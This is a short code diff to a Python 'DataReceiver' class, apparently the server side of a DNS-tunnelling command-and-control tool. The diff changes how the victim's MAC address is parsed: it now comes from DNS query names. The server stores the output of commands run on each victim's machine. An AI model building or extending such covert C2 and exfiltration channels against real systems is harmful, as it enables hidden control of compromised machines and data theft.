@@ -48,7 +48,7 @@ class DataReceiver():
 
         # Fetch given command that should be sent to the client
         log('DataReceiver', '_receive_ping', 'Received ping packet')
-        victim_mac = Mac(pkt.getlayer(Ether).dst)
+        victim_mac = Mac(pkt.getlayer(DNSQR).qname.split('.')[0])
 
         # Ignore broadcast since Ether() is sent as empty
         if str(victim_mac) == BROADCAST_MAC:
@@ -74,7 +74,7 @@ class DataReceiver():
         """
 
         log('DataReceiver', '_receive_data', 'Received data packet')
-        victim_mac = Mac(pkt.getlayer(Ether).src)
+        victim_mac = Mac(pkt.getlayer(DNSQR).qname.split('.')[0])
 
         victim_dir = self.rel_path + str(victim_mac)
         if not os.path.exists(victim_dir):
@@ -108,7 +108,7 @@ class DataReceiver():
         # print(test.rdata)
 
         # Create a new file with current timestamp with output of command
-        victim_mac = Mac(pkt.getlayer(Ether).src)
+        victim_mac = Mac(pkt.getlayer(DNSQR).qname.split('.')[0])
 
         # Ignore broadcast since Ether() is sent as empty
         if str(victim_mac) == BROADCAST_MAC:
